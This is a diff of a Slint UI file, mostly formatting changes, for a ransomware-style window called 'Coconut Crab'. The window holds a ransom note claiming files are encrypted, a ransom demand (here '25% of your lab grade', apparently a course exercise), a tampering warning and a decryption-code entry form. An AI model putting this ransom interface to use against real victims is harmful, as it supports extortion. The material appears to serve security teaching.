@@ -6,14 +6,13 @@ export component Main inherits Window {
     in property <bool> status-progress: false;
     in-out property <string> code;
     in property <bool> code-valid: false;
-    out property<string> code-field-1;
-    out property<string> code-field-2;
-    out property<string> code-field-3;
-    out property<string> code-field-4;
+    out property <string> code-field-1;
+    out property <string> code-field-2;
+    out property <string> code-field-3;
+    out property <string> code-field-4;
     callback enforce-code-field-format(string) -> string;
     callback update-code();
     callback try-decrypt();
-
     always-on-top: true;
     title: "Coconut Crab";
     icon: window-icon;
@@ -27,21 +26,25 @@ export component Main inherits Window {
             font-size: 18px;
             color: Palette.accent-background;
         }
+
         Text {
             text: "Your important files are encrypted. Many of your documents, photos, videos, databases, and other files are no longer accessible. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.";
             wrap: word-wrap;
             font-size: 14px;
         }
+
         Text {
             text: "In order to receive the decryption code requested below, you must pay a ransom of 25% of your lab grade. To initiate this process, send an email to example@email.com.";
             wrap: word-wrap;
             font-size: 14px;
         }
+
         Text {
             text: "Attempts to tamper with this process may result in permanent loss of your files.";
             wrap: word-wrap;
             font-size: 14px;
         }
+
         Text {
             text: status-text;
             wrap: word-wrap;
@@ -51,11 +54,13 @@ export component Main inherits Window {
             vertical-alignment: center;
             height: 20px;
         }
+
         ProgressIndicator {
             height: 3px;
             progress: 0%;
             indeterminate: status-progress;
         }
+
         HorizontalLayout {
             alignment: space-between;
             height: 30px;
@@ -64,75 +69,82 @@ export component Main inherits Window {
                     font-size: 14px;
                     text: "Code:  ";
                     vertical-alignment: center;
-                } 
+                }
+
                 LineEdit {
                     font-size: 12px;
                     width: 100px;
                     placeholder-text: "XXXX";
                     horizontal-alignment: center;
                     edited(text) => {
-                        self.text  = enforce-code-field-format(text);
+                        self.text = enforce-code-field-format(text);
                         code-field-1 = self.text;
                         update-code();
-                    } 
+                    }
                 }
+
                 Text {
                     font-size: 12px;
                     text: "  -  ";
                     vertical-alignment: center;
-                } 
+                }
+
                 LineEdit {
                     font-size: 12px;
                     width: 100px;
                     placeholder-text: "XXXX";
                     horizontal-alignment: center;
                     edited(text) => {
-                        self.text  = enforce-code-field-format(text);
+                        self.text = enforce-code-field-format(text);
                         code-field-2 = self.text;
                         update-code();
-                    }                       
+                    }
                 }
+
                 Text {
                     font-size: 12px;
                     text: "  -  ";
                     vertical-alignment: center;
-                } 
+                }
+
                 LineEdit {
                     font-size: 12px;
                     width: 100px;
                     placeholder-text: "XXXX";
                     horizontal-alignment: center;
                     edited(text) => {
-                        self.text  = enforce-code-field-format(text);
+                        self.text = enforce-code-field-format(text);
                         code-field-3 = self.text;
                         update-code();
                     }
                 }
+
                 Text {
                     font-size: 12px;
                     text: "  -  ";
                     vertical-alignment: center;
-                } 
+                }
+
                 LineEdit {
                     font-size: 12px;
                     width: 100px;
                     placeholder-text: "XXXX";
                     horizontal-alignment: center;
                     edited(text) => {
-                        self.text  = enforce-code-field-format(text);
+                        self.text = enforce-code-field-format(text);
                         code-field-4 = self.text;
                         update-code();
-                    } 
+                    }
                 }
             }
         }
+
         Button {
             text: "Decrypt";
             enabled: code-valid;
             clicked => {
                 root.try-decrypt();
             }
-            
         }
     }
 }
